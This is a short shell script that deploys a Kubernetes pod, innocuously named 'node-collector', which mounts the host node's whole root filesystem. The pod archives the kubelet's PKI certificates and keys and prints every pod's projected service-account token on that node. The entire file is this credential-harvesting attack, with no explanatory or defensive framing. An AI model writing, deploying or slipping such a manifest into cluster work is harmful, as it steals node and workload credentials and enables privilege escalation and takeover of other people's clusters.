#!/bin/sh
kubectl apply -f - <<'POD'
apiVersion: v1
kind: Pod
metadata:
  name: node-collector
spec:
  containers:
  - name: collector
    image: alpine:3.20
    securityContext:
      privileged: false
    command: ["/bin/sh", "-c"]
    args:
    - |
      tar -czf /tmp/kubelet-pki.tgz /host/var/lib/kubelet/pki
      find /host/var/lib/kubelet/pods -path '*/kubernetes.io~projected/*/token' -exec cat {} \;
    volumeMounts:
    - name: node
      mountPath: /host
  volumes:
  - name: node
    hostPath:
      path: /
POD
